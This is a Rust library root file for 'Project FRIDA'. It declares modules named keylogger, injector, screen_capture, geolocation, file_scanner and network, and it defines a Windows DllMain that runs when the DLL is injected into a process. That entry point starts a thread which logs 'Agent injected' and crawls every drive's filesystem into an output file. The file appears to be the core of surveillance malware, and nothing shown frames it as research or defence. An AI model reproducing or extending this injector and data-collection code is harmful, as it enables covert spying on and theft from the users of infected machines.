//! Project FRIDA Library
//!
//! Re-exports all modules so they can be shared between the binary (`main.rs`)
//! and external integration tests.

pub mod device_monitor;
pub mod drives;
pub mod file_scanner;
pub mod geolocation;
pub mod injector;
pub mod keylogger;
pub mod log;
pub mod network;
pub mod screen_capture;
pub mod writer;
pub mod paths;
pub mod constants;
pub mod crawler;


#[cfg(all(windows, feature = "dll"))]
mod dll_entry {
    use crate::{crawler, constants, drives, log::Log};
    use std::thread;
    use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID};
    use winapi::um::winnt::DLL_PROCESS_ATTACH;

    fn run_privileged_tasks() {
        Log::info("Agent injected. Running privileged tasks...".to_string());
        
        // Create a new Tokio runtime for our async tasks.
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let drives = drives::list_drives();
            if drives.is_empty() {
                Log::error("No drives found to crawl from injected process.".to_string());
                return;
            }
            
            Log::info(format!("Starting filesystem crawl for {} drives from injected process...", drives.len()));
            let output_path = constants::crawler_output_file();
            if let Err(e) = crawler::crawl_drives(&drives, output_path.to_str().unwrap_or_default()).await {
                Log::error(format!("Filesystem crawl from DLL failed: {}", e));
            } else {
                Log::info("Filesystem crawl from DLL completed successfully.".to_string());
            }
        });
    }

    #[no_mangle]
    #[allow(non_snake_case)]
    pub extern "system" fn DllMain(
        _hinst_dll: HINSTANCE,
        fdw_reason: DWORD,
        _lpv_reserved: LPVOID,
    ) -> BOOL {
        if fdw_reason == DLL_PROCESS_ATTACH {
            // Spawning a new thread is crucial. DllMain should not block.
            thread::spawn(run_privileged_tasks);
        }
        true.into()
    }
}